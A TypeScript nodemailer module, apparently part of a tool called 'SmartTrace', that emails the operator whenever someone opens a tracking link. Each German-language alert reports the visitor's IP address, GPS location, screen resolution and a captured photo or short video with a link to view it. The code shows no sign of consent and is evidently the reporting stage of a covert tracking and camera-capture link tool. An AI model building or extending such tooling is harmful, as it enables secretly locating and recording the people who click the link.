import nodemailer from "nodemailer";

export async function sendCaptureNotification(data: {
  linkId: string;
  ip: string;
  gps: string;
  resolution: string;
  filePath: string;
  createdAt: Date;
}) {
  const host = process.env.SMTP_HOST;
  const port = Number(process.env.SMTP_PORT || 465);
  const user = process.env.SMTP_USER;
  const pass = process.env.SMTP_PASS;
  const recipient = process.env.NOTIFICATION_EMAIL || user;

  if (!host || !user || !pass) {
    console.warn("[SMTP] SMTP not configured. Skipping email notification.");
    return;
  }

  try {
    const transporter = nodemailer.createTransport({
      host,
      port,
      secure: port === 465, // true for 465, false for other ports
      auth: {
        user,
        pass,
      },
    });

    const isVideo = data.filePath.endsWith(".webm") || data.filePath.endsWith(".mp4");
    const mediaType = isVideo ? "Kurzvideo" : "Foto";

    const mailOptions = {
      from: `"SmartTrace System" <${user}>`,
      to: recipient,
      subject: `[Neuer Besucher] Tracking-ID: ${data.linkId}`,
      html: `
        <div style="font-family: Arial, sans-serif; padding: 20px; background-color: #f4f6f9; color: #333;">
          <div style="max-width: 600px; margin: 0 auto; background: #ffffff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05);">
            <h2 style="color: #4f46e5; margin-top: 0;">Neue Besucher-Erfassung</h2>
            <p>Es wurde eine neue Aufnahme über den Tracking-Link erfasst:</p>
            <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
              <tr>
                <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold; width: 140px;">Tracking ID:</td>
                <td style="padding: 10px; border-bottom: 1px solid #eee; color: #4f46e5;">${data.linkId}</td>
              </tr>
              <tr>
                <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">IP-Adresse:</td>
                <td style="padding: 10px; border-bottom: 1px solid #eee;">${data.ip}</td>
              </tr>
              <tr>
                <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">GPS-Standort:</td>
                <td style="padding: 10px; border-bottom: 1px solid #eee;">${data.gps}</td>
              </tr>
              <tr>
                <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">Auflösung:</td>
                <td style="padding: 10px; border-bottom: 1px solid #eee;">${data.resolution}</td>
              </tr>
              <tr>
                <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">Medientyp:</td>
                <td style="padding: 10px; border-bottom: 1px solid #eee;">${mediaType}</td>
              </tr>
              <tr>
                <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">Erfassungszeit:</td>
                <td style="padding: 10px; border-bottom: 1px solid #eee;">${new Date(data.createdAt).toLocaleString()}</td>
              </tr>
            </table>
            <p style="margin-top: 20px;">
              <a href="${data.filePath}" target="_blank" style="background: #4f46e5; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block;">Aufnahme ansehen</a>
            </p>
          </div>
        </div>
      `,
    };

    await transporter.sendMail(mailOptions);
    console.log(`[SMTP] E-Mail-Benachrichtigung erfolgreich gesendet an ${recipient}`);
  } catch (error) {
    console.error("[SMTP] Fehler beim Senden der E-Mail:", error);
  }
}
